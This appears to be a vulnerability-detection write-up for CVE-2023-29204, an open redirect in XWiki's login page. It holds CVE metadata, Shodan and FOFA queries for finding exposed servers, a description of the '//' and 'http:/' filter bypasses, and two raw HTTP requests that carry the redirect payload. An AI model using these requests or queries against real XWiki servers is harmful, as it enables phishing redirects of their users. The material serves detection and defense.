---
layout: post
cve_id: CVE-2023-29204
title: XWiki - Open Redirect
pcap: true
pcap_path: /pcaps/2023/CVE-2023-29204.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-29204.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'An attacker can redirect users to malicious websites, leading to phishing
  attacks or malware downloads.

  '
remediation: 'Implement proper input validation and sanitize user-controlled input
  to prevent open redirect vulnerabilities.

  '
reference:
- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-xwph-x6xj-wggv
- https://jira.xwiki.org/browse/XWIKI-10309
- https://jira.xwiki.org/browse/XWIKI-19994
- https://nvd.nist.gov/vuln/detail/CVE-2023-29204
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2023-29204
  cwe-id: CWE-601
  epss-score: 0.09834
  epss-percentile: 0.92734
  cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: xwiki
  product: xwiki
  shodan-query: html:"data-xwiki-reference"
  fofa-query: body="data-xwiki-reference"
tags:
- cve
- cve2023
- xwiki
- redirect
- vuln
---

## üîç Vulnerability Description
XWiki Commons are technical libraries common to several other top level XWiki projects. It is possible to bypass the existing security measures put in place to avoid open redirect by using a redirect such as `//mydomain.com` (i.e. omitting the `http:`). It was also possible to bypass it when using URL such as `http:/mydomain.com`. The problem has been patched on XWiki 13.10.10, 14.4.4 and 14.8RC1.


## üåê HTTP Request
```nohighlight
GET /bin/login/XWiki/XWikiLogin?xredirect=//www.oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /bin/login/XWiki/XWikiLogin?xredirect=http:/www.oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

